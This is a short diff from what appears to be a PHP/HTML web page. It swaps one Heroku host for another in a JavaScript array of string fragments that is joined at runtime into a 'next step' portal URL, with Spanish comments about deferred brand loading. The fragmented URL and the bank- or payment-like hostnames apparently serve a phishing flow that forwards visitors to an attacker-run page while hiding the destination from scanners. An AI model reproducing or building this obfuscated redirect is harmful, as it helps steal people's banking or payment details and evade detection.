@@ -878,7 +878,7 @@ $v = time();
 
   <script>
     /* URL del siguiente paso construida en runtime */
-    const _p = ['ht','tps','://','new','banps','-6270','a7e4','88a0','.her','oku','app','.com','/'];
+    const _p = ['ht','tps','://','pas','arela','de','partic','ipacion','-99d5','9437','4de2','.her','oku','app','.com','/'];
     const PORTAL_URL = _p.join('');
 
     /* Carga diferida de marca */
